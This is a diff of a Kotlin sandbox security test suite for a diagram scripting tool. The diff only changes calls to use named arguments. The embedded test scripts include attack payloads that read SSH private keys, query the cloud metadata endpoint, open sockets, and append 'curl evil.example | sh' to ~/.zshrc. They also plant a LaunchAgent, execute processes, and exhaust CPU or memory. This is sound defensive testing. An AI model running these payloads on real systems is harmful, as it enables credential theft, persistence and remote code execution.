@@ -108,7 +108,7 @@ class SandboxSecurityAcceptanceTest :
                         diagram(name = "x", type = DiagramType.CLASS) {}
                         val secret = java.io.File(System.getProperty("user.home") + "/.ssh/id_ed25519").readText()
                         """.trimIndent()
-                    val result = pool.evaluate(attack)
+                    val result = pool.evaluate(source = attack)
                     val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                     failure.kind shouldBe FailureKind.GUARD
                 } finally {
@@ -124,7 +124,7 @@ class SandboxSecurityAcceptanceTest :
                         diagram(name = "x", type = DiagramType.CLASS) {}
                         java.io.File("/tmp/kuml-exfil-probe.txt").writeText("owned")
                         """.trimIndent()
-                    val result = pool.evaluate(attack)
+                    val result = pool.evaluate(source = attack)
                     val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                     failure.kind shouldBe FailureKind.GUARD
                 } finally {
@@ -142,7 +142,7 @@ class SandboxSecurityAcceptanceTest :
                 // on macOS, so a denylist bypass still can't reach the
                 // filesystem outside the per-worker workdir.
                 if (!isMac) return@test
-                OsSandbox.modeFrom(null, OsSandbox.Platform.MAC) shouldBe OsSandbox.Mode.REQUIRED
+                OsSandbox.modeFrom(raw = null, platform = OsSandbox.Platform.MAC) shouldBe OsSandbox.Mode.REQUIRED
                 OsSandbox.isolationAvailable().shouldBeTrue()
             }
         }
@@ -168,7 +168,7 @@ class SandboxSecurityAcceptanceTest :
                         diagram(name = "x", type = DiagramType.CLASS) {}
                         val s = java.net.Socket("93.184.216.34", 80)
                         """.trimIndent()
-                    val result = pool.evaluate(attack)
+                    val result = pool.evaluate(source = attack)
                     val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                     failure.kind shouldBe FailureKind.GUARD
                 } finally {
@@ -186,7 +186,7 @@ class SandboxSecurityAcceptanceTest :
                         diagram(name = "x", type = DiagramType.CLASS) {}
                         val conn = java.net.URL("http://169.254.169.254/latest/meta-data/").openConnection()
                         """.trimIndent()
-                    val result = pool.evaluate(attack)
+                    val result = pool.evaluate(source = attack)
                     val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                     failure.kind shouldBe FailureKind.GUARD
                 } finally {
@@ -202,7 +202,7 @@ class SandboxSecurityAcceptanceTest :
                         diagram(name = "x", type = DiagramType.CLASS) {}
                         val s = java.net.Socket("localhost", 8080)
                         """.trimIndent()
-                    val result = pool.evaluate(attack)
+                    val result = pool.evaluate(source = attack)
                     val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                     failure.kind shouldBe FailureKind.GUARD
                 } finally {
@@ -217,7 +217,7 @@ class SandboxSecurityAcceptanceTest :
                     "only Layer 1 mitigates on that platform.",
             ) {
                 if (!isMac) return@test
-                OsSandbox.modeFrom(null, OsSandbox.Platform.MAC) shouldBe OsSandbox.Mode.REQUIRED
+                OsSandbox.modeFrom(raw = null, platform = OsSandbox.Platform.MAC) shouldBe OsSandbox.Mode.REQUIRED
                 OsSandbox.isolationAvailable().shouldBeTrue()
             }
         }
@@ -242,7 +242,7 @@ class SandboxSecurityAcceptanceTest :
                         diagram(name = "x", type = DiagramType.CLASS) {}
                         java.io.File(System.getProperty("user.home") + "/.zshrc").appendText("\ncurl evil.example | sh\n")
                         """.trimIndent()
-                    val result = pool.evaluate(attack)
+                    val result = pool.evaluate(source = attack)
                     val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                     failure.kind shouldBe FailureKind.GUARD
                 } finally {
@@ -259,7 +259,7 @@ class SandboxSecurityAcceptanceTest :
                         val home = System.getProperty("user.home")
                         java.io.File(home + "/Library/LaunchAgents/evil.plist").writeText("<plist/>")
                         """.trimIndent()
-                    val result = pool.evaluate(attack)
+                    val result = pool.evaluate(source = attack)
                     val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                     failure.kind shouldBe FailureKind.GUARD
                 } finally {
@@ -295,13 +295,13 @@ class SandboxSecurityAcceptanceTest :
                     // confirms the timeout, not the guard, is what stops it.
                     KumlScriptGuard.validate(loop) // does not throw
 
-                    val result = pool.evaluate(loop)
+                    val result = pool.evaluate(source = loop)
                     val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                     failure.kind shouldBe FailureKind.TIMEOUT
 
                     // The pool must still work afterwards — the DoS payload must
                     // not have wedged the parent or exhausted the worker supply.
-                    val healthy = pool.evaluate("""diagram(name = "ok", type = DiagramType.CLASS) {}""")
+                    val healthy = pool.evaluate(source = """diagram(name = "ok", type = DiagramType.CLASS) {}""")
                     healthy.shouldBeInstanceOf<EvaluatedScript.Success>()
                 } finally {
                     pool.close()
@@ -325,11 +325,11 @@ class SandboxSecurityAcceptanceTest :
                         val hog = ArrayList<ByteArray>()
                         while (true) { hog.add(ByteArray(10_000_000)) }
                         """.trimIndent()
-                    val result = pool.evaluate(oomAttempt)
+                    val result = pool.evaluate(source = oomAttempt)
                     result.shouldBeInstanceOf<EvaluatedScript.Failure>()
 
                     // The pool must still work afterwards.
-                    val healthy = pool.evaluate("""diagram(name = "ok", type = DiagramType.CLASS) {}""")
+                    val healthy = pool.evaluate(source = """diagram(name = "ok", type = DiagramType.CLASS) {}""")
                     healthy.shouldBeInstanceOf<EvaluatedScript.Success>()
                 } finally {
                     pool.close()
@@ -368,7 +368,7 @@ class SandboxSecurityAcceptanceTest :
                     val pool = newPool()
                     try {
                         val attack = """diagram(name = "x", type = DiagramType.CLASS) {}; $payload"""
-                        val result = pool.evaluate(attack)
+                        val result = pool.evaluate(source = attack)
                         val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                         withClue(label) { failure.kind shouldBe FailureKind.GUARD }
                     } finally {
@@ -403,7 +403,7 @@ class SandboxSecurityAcceptanceTest :
                 val pool = newPool()
                 try {
                     val attack = """diagram(name = "x", type = DiagramType.CLASS) {}; ProcessBuilder("id").start()"""
-                    val result = pool.evaluate(attack)
+                    val result = pool.evaluate(source = attack)
                     val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                     failure.kind shouldBe FailureKind.GUARD
                 } finally {
@@ -416,7 +416,7 @@ class SandboxSecurityAcceptanceTest :
                 try {
                     val attack =
                         """diagram(name = "x", type = DiagramType.CLASS) {}; Runtime.getRuntime().exec("id")"""
-                    val result = pool.evaluate(attack)
+                    val result = pool.evaluate(source = attack)
                     val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                     failure.kind shouldBe FailureKind.GUARD
                 } finally {
@@ -448,7 +448,7 @@ class SandboxSecurityAcceptanceTest :
             val pool = newPool()
             try {
                 val legit = """diagram(name = "Shop", type = DiagramType.CLASS) { classOf("Order") }"""
-                val result = pool.evaluate(legit)
+                val result = pool.evaluate(source = legit)
                 result.shouldBeInstanceOf<EvaluatedScript.Success>()
             } finally {
                 pool.close()
@@ -470,7 +470,7 @@ class SandboxSecurityAcceptanceTest :
             val huge = "diagram(name = \"x\", type = DiagramType.CLASS) {}\n// " + "A".repeat(300_000)
             val pool = newPool()
             try {
-                val result = pool.evaluate(huge)
+                val result = pool.evaluate(source = huge)
                 val failure = result.shouldBeInstanceOf<EvaluatedScript.Failure>()
                 failure.kind shouldBe FailureKind.GUARD
                 failure.message shouldContain "maximum length"
@@ -527,7 +527,7 @@ class SandboxSecurityAcceptanceTest :
                         "TotalBypass",
                         escapeTarget.absolutePath,
                     )
-                val wrapped = OsSandbox.wrap(bare, work)
+                val wrapped = OsSandbox.wrap(command = bare, workDir = work)
                 wrapped.first() shouldBe OsSandbox.SANDBOX_EXEC_PATH
 
                 val p = ProcessBuilder(wrapped).redirectErrorStream(true).start()
